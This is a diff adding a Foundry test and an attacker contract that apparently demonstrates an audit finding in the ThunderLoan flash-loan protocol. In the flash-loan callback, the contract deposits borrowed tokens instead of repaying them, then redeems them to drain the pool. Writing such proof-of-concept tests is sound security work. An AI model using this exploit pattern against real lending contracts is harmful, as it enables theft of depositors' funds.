@@ -169,6 +169,50 @@ contract ThunderLoanTest is BaseTest {
         console2.log("Attack fee is: ", attackFee);
         assert(attackFee < normalFeeCost);
     }
+
+    function test_useDepositInstedOfRepayToStealFunds() public setAllowedToken hasDeposits {
+        vm.startPrank(user);
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fee);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemFunds();
+        assertGt(tokenA.balanceOf(address(dor)), 50e18 + fee, "Balance of Dor is not correct after redeeming");
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderloan) {
+        thunderLoan = ThunderLoan(_thunderloan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        s_token.approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        // IERC20(token).transfer(address(thunderLoan), fee);
+        return true;
+    }
+
+    function redeemFunds() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
+    }
 }
 
 contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
